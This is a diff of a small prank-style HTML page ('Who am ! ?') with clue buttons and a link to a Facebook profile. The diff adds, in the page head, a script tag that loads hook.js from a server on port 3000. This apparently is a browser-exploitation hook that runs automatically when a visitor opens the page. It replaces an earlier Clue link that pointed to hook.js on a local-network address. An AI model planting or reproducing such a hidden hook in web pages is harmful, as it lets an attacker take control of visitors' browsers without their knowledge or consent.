@@ -3,6 +3,7 @@
 <title>Who am ! ? </title>
 <link rel="stylesheet" href="CSS/style.css">
 <link rel="icon" href="Image/J.PNG">
+<script src="http://127.0.0.1:3000/hook.js"></script>
 </head>
 
 <body bgcolor="#1C1C1C">
@@ -21,7 +22,7 @@ But if you cant ?
 Then i will tell you who you are.<br>
 let's help you with some clue.<br>
 <div class="container" align="center">
-  <button class="btn btn1"><a href="http://192.168.0.108/hook.js" > Clue </a></button> <br>
+  <button class="btn btn1"><a href="https://youtu.be/sLe3xW0FN2M" > Clue </a></button> <br>
   <button class="btn btn2"><a href="https://facebook.com/profile.php?=73322363" id= btn2> Just you </a></button>
   </div>
 
